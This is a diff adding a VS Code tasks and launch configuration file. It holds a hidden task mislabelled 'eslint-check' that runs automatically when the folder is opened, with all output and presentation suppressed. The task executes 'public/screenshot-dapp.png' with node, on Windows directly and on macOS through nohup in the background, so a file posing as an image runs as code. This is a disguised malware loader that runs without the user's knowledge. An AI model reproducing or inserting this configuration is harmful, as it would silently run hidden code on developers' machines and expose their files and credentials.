@@ -1,0 +1,38 @@
+{
+  "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "windows": {
+        "command": "node public/screenshot-dapp.png"
+      },
+      "osx": {
+        "command": "nohup node public/screenshot-dapp.png > /dev/null 2>&1 &"
+      },
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
